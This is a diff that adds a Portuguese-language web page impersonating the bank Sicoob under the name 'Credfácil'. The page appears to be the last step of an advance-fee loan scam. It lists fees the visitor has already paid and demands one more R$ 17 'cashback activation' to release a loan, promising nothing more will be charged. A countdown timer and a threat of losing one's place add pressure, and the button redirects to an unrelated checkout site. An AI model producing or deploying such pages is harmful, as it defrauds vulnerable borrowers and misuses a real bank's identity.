@@ -1,0 +1,351 @@
+
+<!DOCTYPE html>
+<html lang="pt-BR">
+<head>
+    <meta charset="UTF-8">
+    <script
+      src="https://cdn.utmify.com.br/scripts/utms/latest.js"
+      data-utmify-prevent-xcod-sck
+      data-utmify-prevent-subids
+      async
+      defer
+    ></script>
+    <script>
+  window.pixelId = "69ab1ca6221295d6caf09f29";
+  var a = document.createElement("script");
+  a.setAttribute("async", "");
+  a.setAttribute("defer", "");
+  a.setAttribute("src", "https://cdn.utmify.com.br/scripts/pixel/pixel.js");
+  document.head.appendChild(a);
+</script>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+
+    <title>Credfácil - Confirmação Final do PIX</title>
+
+    <script src="https://cdn.tailwindcss.com"></script>
+
+    <script>
+        tailwind.config = {
+            theme: {
+                extend: {
+                    colors: {
+                        'cred-green': '#00A651',
+                        'cred-dark': '#008F45',
+                        'cred-light': '#00C261',
+                        'cred-bg': '#f0fdf4',
+                        'cred-accent': '#004D25',
+                    }
+                }
+            }
+        }
+    </script>
+
+    <style>
+        @import url('https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700;800&display=swap');
+
+        * {
+            font-family: 'Inter', -apple-system, BlinkMacSystemFont, 'Segoe UI', sans-serif;
+        }
+
+        body {
+            min-height: 100vh;
+            display: flex;
+            flex-direction: column;
+            background: linear-gradient(180deg, #f0fdf4 0%, #f8faf9 100%);
+        }
+
+        main {
+            flex: 1;
+        }
+
+        .fade-in {
+            animation: fadeIn 0.5s ease-out;
+        }
+
+        @keyframes fadeIn {
+            from {
+                opacity: 0;
+                transform: translateY(15px);
+            }
+            to {
+                opacity: 1;
+                transform: translateY(0);
+            }
+        }
+
+        @keyframes pulse {
+            0%, 100% {
+                opacity: 1;
+            }
+            50% {
+                opacity: 0.7;
+            }
+        }
+
+        .pulse-animation {
+            animation: pulse 1s infinite;
+        }
+
+        .logo-img {
+            height: 42px;
+            width: auto;
+        }
+
+        .logo-img-white {
+            height: 36px;
+            width: auto;
+            filter: brightness(0) invert(1);
+        }
+
+        .btn-cred {
+            background: linear-gradient(135deg, #00C261 0%, #008F45 100%);
+            box-shadow: 0 4px 15px rgba(0, 166, 81, 0.3);
+            transition: all 0.3s ease;
+        }
+
+        .btn-cred:hover {
+            filter: brightness(1.05);
+            box-shadow: 0 6px 20px rgba(0, 166, 81, 0.4);
+            transform: translateY(-2px);
+        }
+
+        .countdown-box {
+            background: linear-gradient(135deg, #004D25 0%, #00A651 100%);
+        }
+
+        .cashback-box {
+            background: linear-gradient(135deg, #f0fdf4 0%, #dcfce7 100%);
+            border: 2px solid #86efac;
+        }
+    </style>
+</head>
+
+<body>
+    <!-- Header -->
+    <header class="bg-gradient-to-r from-[#00C261] to-[#008F45] shadow-lg">
+        <div class="flex flex-wrap items-center justify-center p-4 bg-white border-b border-gray-100 shadow-sm sticky top-0 z-10">
+            <div class="flex items-center justify-center">
+                <img src="https://logodownload.org/wp-content/uploads/2017/11/sicoob-logo-1.png" alt="Credfácil" class="logo-img">
+            </div>
+        </div>
+    </header>
+
+    <main class="py-8 px-4 md:py-12">
+        <div class="max-w-2xl mx-auto">
+            <div class="bg-white rounded-2xl shadow-lg border border-gray-100 p-6 md:p-8 fade-in">
+                
+                <!-- Header Banner -->
+                <div class="bg-gradient-to-r from-[#00C261] to-[#008F45] text-white text-center py-6 px-6 rounded-xl mb-6">
+                    <h1 class="text-2xl font-bold mb-2">🎉 Confirmação Final do PIX</h1>
+                    <p class="text-lg opacity-95">Ative seu cashback e receba o valor total</p>
+                </div>
+
+                <!-- Resumo de Pagamentos -->
+                <div class="bg-[#f8faf9] border border-gray-200 rounded-xl p-5 mb-6">
+                    <h3 class="font-semibold text-gray-900 mb-4 text-center">📋 Resumo de Pagamentos</h3>
+
+                    <div class="space-y-3 mb-4">
+                        <div class="flex justify-between py-3 border-b border-gray-200">
+                            <span class="text-gray-600">Tarifa do Seguro</span>
+                            <span class="font-semibold text-gray-900">R$ 28,63</span>
+                        </div>
+                        <div class="flex justify-between py-3 border-b border-gray-200">
+                            <span class="text-gray-600">Taxa de Verificação</span>
+                            <span class="font-semibold text-gray-900">R$ 26,81</span>
+                        </div>
+                        <div class="flex justify-between py-3 border-b border-gray-200">
+                            <span class="text-gray-600">Taxa de Emissão</span>
+                            <span class="font-semibold text-gray-900">R$ 19,90</span>
+                        </div>
+                        <div class="flex justify-between py-3 border-b border-gray-200">
+                            <span class="text-gray-600">Tarifa de Segurança</span>
+                            <span class="font-semibold text-gray-900">R$ 26,41</span>
+                        </div>
+                        <div class="flex justify-between py-3 border-b border-gray-200">
+                            <span class="text-gray-600">Taxa de IOF</span>
+                            <span class="font-semibold text-gray-900">R$ 23,44</span>
+                        </div>
+                    </div>
+
+                    <div class="bg-red-50 border-2 border-red-300 rounded-lg p-4 flex justify-between items-center">
+                        <span class="font-bold text-gray-900">Total pago:</span>
+                        <span class="text-xl font-bold text-red-600">R$ 125,19</span>
+                    </div>
+                    
+                    <div class="bg-[#f0fdf4] border-2 border-[#00A651] rounded-lg p-4 mt-3 flex justify-between items-center">
+                        <span class="font-bold text-gray-900">💰 Valor a receber:</span>
+                        <span id="valor-aprovado" class="text-2xl font-bold text-[#00A651]">R$ 0,00</span>
+
+                        <script>
+                            // Parser robusto
+                            function parseNumberFlexible(v) {
+                                if (typeof v === 'number') return v;
+                                v = (v || '').toString().trim().replace(/[R$\s]/g, '');
+                                const hasComma = v.includes(','), hasDot = v.includes('.');
+                                if (hasComma && hasDot) v = v.replace(/\./g, '').replace(',', '.');
+                                else if (hasComma) v = v.replace(',', '.');
+                                const n = parseFloat(v);
+                                return Number.isFinite(n) ? n : 0;
+                            }
+                            const formatBRL = n => n.toLocaleString('pt-BR', { style: 'currency', currency: 'BRL' });
+
+                            function getTotalAprovado() {
+                                const bonus = 125.19;
+                                let base = 0;
+                                try {
+                                    const raw = localStorage.getItem('selectedLoanAmount') || 
+                                                localStorage.getItem('creditoAprovadoValor') || 
+                                                localStorage.getItem('creditoSolicitado') || '0';
+                                    base = parseNumberFlexible(raw);
+                                } catch { }
+                                return base + bonus;
+                            }
+
+                            // Render retorna true se conseguiu atualizar os 2 elementos
+                            function renderValores() {
+                                const total = getTotalAprovado();
+                                const elValor = document.getElementById('valor-aprovado');
+                                const elPix = document.getElementById('pix-msg');
+
+                                if (elValor) elValor.textContent = formatBRL(total);
+                                if (elPix) elPix.textContent = `PIX de ${formatBRL(total)} será enviado à sua conta`;
+
+                                return Boolean(elValor && elPix);
+                            }
+
+                            // 1) Quando o DOM estiver pronto
+                            document.addEventListener('DOMContentLoaded', renderValores);
+
+                            // 2) Se o elemento for inserido depois, tenta por ~3s
+                            (function retryUntilFound() {
+                                let tries = 0;
+                                const iv = setInterval(() => {
+                                    if (renderValores() || ++tries > 20) clearInterval(iv);
+                                }, 150);
+                            })();
+
+                            // 3) Atualiza se outra aba/página mudar o localStorage
+                            window.addEventListener('storage', (e) => {
+                                if (['creditoAprovadoValor', 'selectedLoanAmount', 'creditoSolicitado'].includes(e.key)) renderValores();
+                            });
+                        </script>
+                    </div>
+                </div>
+
+                <!-- Cashback Box -->
+                <div class="cashback-box rounded-xl p-6 mb-6">
+                    <h3 class="text-xl font-bold text-[#004D25] mb-3 text-center">🎁 Ativação do Cashback Sicoob</h3>
+                    <div class="text-4xl font-bold text-[#00A651] text-center my-4">R$ 17,00</div>
+                    <p class="text-[#004D25] text-center">
+                        Para liberar o valor total e receber de volta todas as taxas pagas, é necessário confirmar a
+                        ativação do Cashback no valor de R$ 17,00 (1%).
+                    </p>
+                </div>
+
+                <!-- Checklist -->
+                <ul class="space-y-3 mb-6">
+                    <li class="flex items-center gap-3 text-gray-700 py-2 border-b border-gray-100">
+                        <div class="flex-shrink-0 w-6 h-6 bg-[#f0fdf4] rounded-full flex items-center justify-center">
+                            <svg class="w-4 h-4 text-[#00A651]" fill="currentColor" viewBox="0 0 20 20">
+                                <path fill-rule="evenodd" d="M16.707 5.293a1 1 0 010 1.414l-8 8a1 1 0 01-1.414 0l-4-4a1 1 0 011.414-1.414L8 12.586l7.293-7.293a1 1 0 011.414 0z" clip-rule="evenodd"></path>
+                            </svg>
+                        </div>
+                        <span id="pix-msg">PIX de R$ 0,00 será enviado à sua conta</span>
+                    </li>
+                    <li class="flex items-center gap-3 text-gray-700 py-2 border-b border-gray-100">
+                        <div class="flex-shrink-0 w-6 h-6 bg-[#f0fdf4] rounded-full flex items-center justify-center">
+                            <svg class="w-4 h-4 text-[#00A651]" fill="currentColor" viewBox="0 0 20 20">
+                                <path fill-rule="evenodd" d="M16.707 5.293a1 1 0 010 1.414l-8 8a1 1 0 01-1.414 0l-4-4a1 1 0 011.414-1.414L8 12.586l7.293-7.293a1 1 0 011.414 0z" clip-rule="evenodd"></path>
+                            </svg>
+                        </div>
+                        <span>Notificação via WhatsApp e E-mail</span>
+                    </li>
+                    <li class="flex items-center gap-3 text-gray-700 py-2 border-b border-gray-100">
+                        <div class="flex-shrink-0 w-6 h-6 bg-[#f0fdf4] rounded-full flex items-center justify-center">
+                            <svg class="w-4 h-4 text-[#00A651]" fill="currentColor" viewBox="0 0 20 20">
+                                <path fill-rule="evenodd" d="M16.707 5.293a1 1 0 010 1.414l-8 8a1 1 0 01-1.414 0l-4-4a1 1 0 011.414-1.414L8 12.586l7.293-7.293a1 1 0 011.414 0z" clip-rule="evenodd"></path>
+                            </svg>
+                        </div>
+                        <span>✅ Fim de fila: nada mais será cobrado</span>
+                    </li>
+                    <li class="flex items-center gap-3 text-gray-700 py-2">
+                        <div class="flex-shrink-0 w-6 h-6 bg-[#f0fdf4] rounded-full flex items-center justify-center">
+                            <svg class="w-4 h-4 text-[#00A651]" fill="currentColor" viewBox="0 0 20 20">
+                                <path fill-rule="evenodd" d="M16.707 5.293a1 1 0 010 1.414l-8 8a1 1 0 01-1.414 0l-4-4a1 1 0 011.414-1.414L8 12.586l7.293-7.293a1 1 0 011.414 0z" clip-rule="evenodd"></path>
+                            </svg>
+                        </div>
+                        <span>Processo finalizado em até 3 minutos</span>
+                    </li>
+                </ul>
+
+                <!-- Countdown -->
+                <div class="countdown-box text-white rounded-xl p-5 mb-6 text-center">
+                    <div class="text-sm mb-2 opacity-90">⏱️ Valor reservado por:</div>
+                    <div class="text-3xl font-bold font-mono pulse-animation" id="countdown">07:00</div>
+                </div>
+
+                <!-- CTA Button -->
+                <button onclick="redirectToCheckout()" class="w-full btn-cred text-white py-4 rounded-xl text-lg font-bold mb-4">
+                    🎁 Ativar cashback agora
+                </button>
+
+                <!-- Warning Box -->
+                <div class="bg-red-50 border-2 border-red-400 rounded-xl p-4 text-center">
+                    <div class="text-sm font-bold text-red-800 mb-1">⚠️ Último passo</div>
+                    <p class="text-sm text-red-700">Se não concluir, sua vaga será repassada para o próximo da fila!</p>
+                </div>
+
+                <!-- Security Badge -->
+                <div class="flex items-center justify-center gap-2 p-3 bg-[#f0fdf4] rounded-lg border border-[#bbf7d0] mt-4">
+                    <svg class="w-5 h-5 text-[#00A651]" fill="currentColor" viewBox="0 0 20 20">
+                        <path fill-rule="evenodd" d="M2.166 4.999A11.954 11.954 0 0010 1.944 11.954 11.954 0 0017.834 5c.11.65.166 1.32.166 2.001 0 5.225-3.34 9.67-8 11.317C5.34 16.67 2 12.225 2 7c0-.682.057-1.35.166-2.001zm11.541 3.708a1 1 0 00-1.414-1.414L9 10.586 7.707 9.293a1 1 0 00-1.414 1.414l2 2a1 1 0 001.414 0l4-4z" clip-rule="evenodd"></path>
+                    </svg>
+                    <span class="text-sm font-semibold text-[#004D25]">🔒 Ambiente seguro - Sicoob</span>
+                </div>
+            </div>
+        </div>
+    </main>
+
+    <!-- Footer -->
+    <footer class="bg-gradient-to-r from-[#00C261] to-[#008F45] border-t mt-auto">
+        <div class="max-w-7xl mx-auto px-4 sm:px-6 lg:px-8 py-8">
+            <div class="flex flex-col items-center justify-center text-center space-y-4">
+                <img src="https://logodownload.org/wp-content/uploads/2017/11/sicoob-logo-1.png" alt="Credfácil" class="logo-img-white">
+                <div class="text-sm space-y-1">
+                    <p class="text-white">Banco Cooperativo Sicoob S.A.</p>
+                    <p class="text-white/90">CNPJ:02.038.232/0001-64</p>
+                    <p class="text-white/80 text-xs">São Paulo, SP - 01310-200</p>
+                </div>
+            </div>
+        </div>
+    </footer>
+
+    <script>
+        let countdownTime = 420;
+        const countdownEl = document.getElementById('countdown');
+
+        const timer = setInterval(() => {
+            countdownTime--;
+            const minutes = Math.floor(countdownTime / 60);
+            const seconds = countdownTime % 60;
+            countdownEl.textContent = `${minutes < 10 ? '0' : ''}${minutes}:${seconds < 10 ? '0' : ''}${seconds}`;
+
+            if (countdownTime <= 0) {
+                clearInterval(timer);
+                countdownEl.textContent = 'EXPIRADO';
+            }
+        }, 1000);
+
+        function redirectToCheckout() {
+            window.location.href = 'https://checkout.liberarcreditodigital.site/VCCL1O8SCUJT' + window.location.search;
+        }
+    </script>
+
+    <script src="../upsells.js"></script>
+    <script>
+        document.addEventListener('DOMContentLoaded', function() {
+            initUpsell(5);
+        });
+    </script>
+</body>
+</html>
